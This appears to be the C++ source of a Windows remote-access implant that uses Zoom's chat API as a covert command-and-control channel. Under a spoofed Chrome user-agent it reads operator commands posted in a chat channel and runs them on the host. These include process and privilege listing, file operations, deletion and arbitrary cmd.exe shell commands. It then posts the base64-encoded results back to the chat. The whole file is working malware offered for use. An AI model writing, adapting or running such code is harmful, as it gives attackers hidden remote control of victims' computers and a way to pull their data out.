#include <windows.h>
#include <wininet.h>
#include "SendRecv.h"
#include "ParseJson.h"
#include "commands.h"
#include "ReplaceWebStuff.h"
#include "encoding.h"

#pragma comment(lib, "WinINet.lib")

const char* channel = "CHANNEL_ID";
LPSTR accessToken = (LPSTR)"TOKEN";

// Function: first4079Chars
// Copies the first 4079 characters from the source string to the destination string.
// Parameters:
// - str: Pointer to the source string.
// - dest: Pointer to the destination string.
void first4079Chars(LPSTR str, LPSTR dest) {
    strncpy_s(dest, 4080, str, 4079);   // Copy at most 4079 characters from 'str' to 'dest'
    dest[4079] = '\0';   // Null-terminate the destination string at the 4079th character
}


// Function: addPrefix
// Adds a prefix string to the given string.
// Parameters:
// - str: Pointer to the input string.
// - prefix: Pointer to the prefix string.
// Returns:
// - Pointer to the new string with the added prefix, or NULL if memory allocation fails.
const char* addPrefix(const char* str, const char* prefix) {
    size_t prefixLen = strlen(prefix);   // Length of the prefix string
    size_t strLen = strlen(str);         // Length of the input string

    char* newStr = (char*)malloc(prefixLen + strLen + 1);   // Allocate memory for the new string
    if (newStr == NULL) {
        return NULL;    // Return NULL if memory allocation fails
    }

    memcpy(newStr, prefix, prefixLen);   // Copy the prefix string to the new string

    memcpy(newStr + prefixLen, str, strLen);   // Copy the input string to the new string after the prefix

    newStr[prefixLen + strLen] = '\0';   // Add null terminator at the end of the new string

    return newStr;   // Return the pointer to the new string
}


// Function: StartConnection
// Starts a connection to a specified server using WinINet library.
// Parameters:
// - hConnect: Reference to the HINTERNET handle that will hold the connection.
// Returns:
// - 0 if the connection is successfully established, 1 otherwise.
int StartConnection(HINTERNET& hConnect) {
    // Open an internet session
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        return 1;   // Return 1 if the internet session fails to open
    }

    // Connect to the server
    hConnect = InternetConnectA(hInternet, "api.zoom.us", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)NULL);
    if (hConnect == NULL) {
        InternetCloseHandle(hInternet);   // Close the internet session
        return 1;   // Return 1 if the connection to the server fails
    }

    return 0;   // Return 0 if the connection is successfully established
}

// Function: SendRequest
// Sends an HTTP request to a specified endpoint using WinINet library.
// Parameters:
// - hRequest: Reference to the HINTERNET handle that will hold the request.
// - method: Pointer to the method string (e.g., "POST", "GET").
// - endpoint: Pointer to the endpoint string.
// - requestData: Pointer to the request data string.
// Returns:
// - 0 if the request is successfully sent, 1 otherwise.
int SendRequest(HINTERNET& hRequest, const char* method, const char* endpoint, const char* requestData) {
    CHAR stars[] = { '*','/','*',0 };   // A character array used as a wildcard accept type
    LPCSTR acceptTypes[] = { stars, NULL };   // Array of accepted types for the request
    HINTERNET hConnect;
    StartConnection(hConnect);   // Start the connection and store it in hConnect

    hRequest = HttpOpenRequestA(hConnect, method, endpoint, NULL, NULL, acceptTypes, INTERNET_FLAG_SECURE | INTERNET_FLAG_DONT_CACHE, 0);
    if (hRequest == NULL) {
        InternetCloseHandle(hConnect);   // Close the connection
        return 1;   // Return 1 if opening the request fails
    }

    const char* CONTENT = "Content-Type: application/json\r\nAuthorization: Bearer ";
    char requestHeaders[4000];   // An array that will store the final headers.
    memset(requestHeaders, 0, sizeof(requestHeaders));   // Clear the headers array by setting all its elements to 0.

    lstrcatA(requestHeaders, CONTENT);   // Concatenate the Content-type header to the headers string
    lstrcatA(requestHeaders, accessToken);   // Concatenate the access token to the headers string

    int headersize = lstrlenA(requestHeaders);
    int requestDataSize = lstrlenA(requestData);

    BOOL result;
    if (strcmp(method, "POST") == 0) {
        result = HttpSendRequestA(hRequest, requestHeaders, (DWORD)headersize, (LPVOID)requestData, (DWORD)requestDataSize);
    }
    else if (strcmp(method, "GET") == 0) {
        result = HttpSendRequestA(hRequest, requestHeaders, (DWORD)headersize, NULL, NULL);
    }
    else {
        result = HttpSendRequestA(hRequest, requestHeaders, (DWORD)headersize, (LPVOID)requestData, (DWORD)requestDataSize);
    }

    if (!result) {
        InternetCloseHandle(hConnect);   // Close the connection
        return 1;   // Return 1 if sending the request fails
    }

    return 0;   // Return 0 if the request is successfully sent
}

// Function: UpdateTheMessage
// Updates a specific message with the provided content using an HTTP PUT request.
// Parameters:
// - message: Pointer to the message content.
// - id: Pointer to the ID of the message to be updated.
// Returns:
// - 0 if the message is successfully updated, 1 otherwise.
int UpdateTheMessage(const char* message, LPSTR id) {
    CHAR endpoint[2048];

    LPSTR mainEndpoint = (LPSTR)"/v2/chat/users/me/messages/";
    memset(endpoint, 0, sizeof(endpoint));
    lstrcatA(endpoint, mainEndpoint);
    lstrcatA(endpoint, id);

    LPSTR tempRequestData = ReplaceParameters(message, channel);  // Replace any parameters in the message content
    char* requestData = replaceBackslashes(tempRequestData);  // Replace backslashes in the request data

    HINTERNET hRequest;
    SendRequest(hRequest, "PUT", endpoint, requestData);  // Send a PUT request to update the message

    // Read the response
    const int bufferSize = 4096;
    ULONG atBuffSize = 1 << 13;
    SIZE_T responseSize = (SIZE_T)atBuffSize;
    PVOID response = VirtualAlloc(0, responseSize, MEM_COMMIT, PAGE_READWRITE);
    memset(response, 0, responseSize);
    DWORD bytesRead = -1;
    BOOL bKeepReading = TRUE;

    while (bKeepReading && bytesRead != 0) {
        bKeepReading = InternetReadFile(hRequest, response, bufferSize, &bytesRead);
    }

    if (strncmp((const char*)response, "{\"code\":124", 11) == 0) {
        printf("Invalid access token.");
        ExitProcess(0);
    }

    return 0;  // Return 0 if the message is successfully updated
}


// Function: SendTheMessage
// Sends a message using an HTTP POST request and retrieves the generated message ID.
// Parameters:
// - message: Pointer to the message content.
// - id: Reference to the pointer that will store the generated message ID.
// Returns:
// - 0 if the message is successfully sent, 1 otherwise.
int SendTheMessage(const char* message, LPSTR& id) {
    const char* endpoint = "/v2/chat/users/me/messages";

    LPSTR tempRequestData = ReplaceParameters(message, channel);  // Replace any parameters in the message content
    char* requestData = replaceBackslashes(tempRequestData);  // Replace backslashes in the request data

    HINTERNET hRequest;
    SendRequest(hRequest, "POST", endpoint, requestData);  // Send a POST request to send the message

    // Read the response
    const int bufferSize = 4096;
    ULONG atBuffSize = 1 << 13;
    SIZE_T responseSize = (SIZE_T)atBuffSize;
    PVOID response = VirtualAlloc(0, responseSize, MEM_COMMIT, PAGE_READWRITE);
    memset(response, 0, responseSize);
    DWORD bytesRead = -1;
    BOOL bKeepReading = TRUE;

    while (bKeepReading && bytesRead != 0) {
        bKeepReading = InternetReadFile(hRequest, response, bufferSize, &bytesRead);
    }

    if (strncmp((const char*)response, "{\"code\":124", 11) == 0) {
        printf("Invalid access token.");
        ExitProcess(0);
    }

    id = (LPSTR)response;
    id += 7;
    id[strlen(id) - 2] = '\0';  // Extract the message ID from the response

    return 0;  // Return 0 if the message is successfully sent
}

// Function: RecvTheMessage
// Retrieves a message with the specified ID using an HTTP GET request and performs command execution based on the message content.
// Parameters:
// - id: Pointer to the message ID.
// - output: Reference to the pointer that will store the output of the command execution.
// Returns:
// - 0 if the message is successfully retrieved and command execution is performed, 1 otherwise.
int RecvTheMessage(const char* id, LPSTR &output) {
    
    CHAR endpoint[5000];
    LPSTR firstHalf = (LPSTR)"/v2/chat/users/me/messages/";
    LPSTR secondHalf = (LPSTR)"?to_channel=";
    memset(endpoint, 0, sizeof(endpoint));
    lstrcatA(endpoint, firstHalf);
    lstrcatA(endpoint, id);
    lstrcatA(endpoint, secondHalf);
    lstrcatA(endpoint, channel);
    
    HINTERNET hRequest;
    
    SendRequest(hRequest, "GET", endpoint, "");
    
    const int bufferSize = 4096;
    ULONG atBuffSize = 1 << 13;
    SIZE_T responseSize = (SIZE_T)atBuffSize;
    PVOID response = VirtualAlloc(0, responseSize, MEM_COMMIT, PAGE_READWRITE);;
    memset(response, 0, responseSize);
    DWORD bytesRead = -1;
    BOOL bKeepReading = TRUE;

    while (bKeepReading && bytesRead != 0) {
        bKeepReading = InternetReadFile(hRequest, response, bufferSize, &bytesRead);
    }
    
    LPSTR messageStart = NULL;
    messageStart = (LPSTR)response;
    messageStart += 56;
    const char* messageEnd = strchr(messageStart, '\"');
    size_t messageLength = messageEnd - messageStart;
    char* message = (char*)malloc(messageLength + 1);
    strncpy_s(message, messageLength + 1, messageStart, messageLength);
    message[messageLength] = '\0';

    if (strncmp(message, "command: ", 9) == 0) {
        const char* command = message + 9;
        if (strcmp(command, "getuid") == 0) {
            output = getuid();
        }

        else if (strcmp(command, "getprivs") == 0) {
            output = getprivs();
        }

        else if (strcmp(command, "ps") == 0) {
            DWORD processCount;
            output = ps(&processCount);
            LPSTR first4079Char = (LPSTR)malloc(4079);
            first4079Chars(output, first4079Char);
            output = first4079Char;
        }

        else if (strcmp(command, "pwd") == 0) {
            output = pwd();
        }

        else if (strncmp(command, "cd", 2) == 0) {
            const char* directory = command + 3;
            BOOL status = cd(directory);
            if (status == TRUE) {
                output = (LPSTR)"Directory changed\n";
            }
            else {
                output = (LPSTR)"Failed To Change Directory\n";
            }
        }

        else if (strncmp(command, "ls", 2) == 0) {
            LPSTR directory;
            if (strlen(command) > 3) {
                directory = (LPSTR)command + 3;
            }
            else {
                directory = pwd();
            }
            output = ls(directory);
        }

        else if (strncmp(command, "mkdir", 5) == 0) {
            const char* directory = command + 6;
            if (strcmp(directory, "") == 0) {
                output = (LPSTR)"Supply a Directory!";
            }
            else {
                output = mkdir(directory);
            }
        }

        else if (strncmp(command, "rm", 2) == 0) {
            const char* directory = command + 3;
            if (strcmp(directory, "") == 0) {
                output = (LPSTR)"Supply a Directory/File!";
            }
            else {
                output = rm(directory);
            }
        }

        else if (strncmp(command, "cp", 2) == 0) {
            const char* directories = command + 3;
            char* token = NULL;
            char* nextToken = NULL;
            LPSTR firstArgument;
            LPSTR secondArgument;
            token = strtok_s((char*)directories, " ", &nextToken);
            if (token != NULL) {
                firstArgument = (LPSTR)token;
                token = strtok_s((char*)NULL, " ", &nextToken);
                if (token != NULL) {
                    secondArgument = (LPSTR)token;
                    output = cp(firstArgument, secondArgument);
                }
                else {
                    output = (LPSTR)"Provide 2nd Argument for Copy";
                }
            }
            else {
                output = (LPSTR)"Provide 1st Argument for Copy";
            }
        }

        else if (strncmp(command, "shell", 5) == 0) {
            const char* mainCommand = command + 6;
            mainCommand = addPrefix(mainCommand, "cmd.exe /c ");
            if (mainCommand == NULL) {
                output = (LPSTR)"Something went wrong, while adding cmd.exe";
            }
            else {
                HANDLE pipeOUT;

                ULONG BuffSize = 1 << 16;
                ULONG outBuffSize = 1 << 16;
                SIZE_T inBufferSize = (SIZE_T)BuffSize;

                LPVOID mainBuffer = VirtualAlloc(0, inBufferSize, MEM_COMMIT, PAGE_READWRITE);
                memset(mainBuffer, 0, outBuffSize);

                pipeOUT = execute_shell_commands((char*)mainCommand);
                ReadFromPipe((char*)mainBuffer, pipeOUT);
                LPSTR data_output = LPSTR(mainBuffer);
                size_t input_size = strlen(data_output);
                const char* encoded_data = base64_encode(data_output, input_size, &input_size);
                output = (LPSTR)encoded_data;
            }
        }

        else if (strcmp(command, "exit") == 0) {
            ExitProcess(0);
        }

        else {
            output = (LPSTR)"Unknown command \n";
        }
    }
    else {
        output = (LPSTR)"";
    }
    
    return 0;
}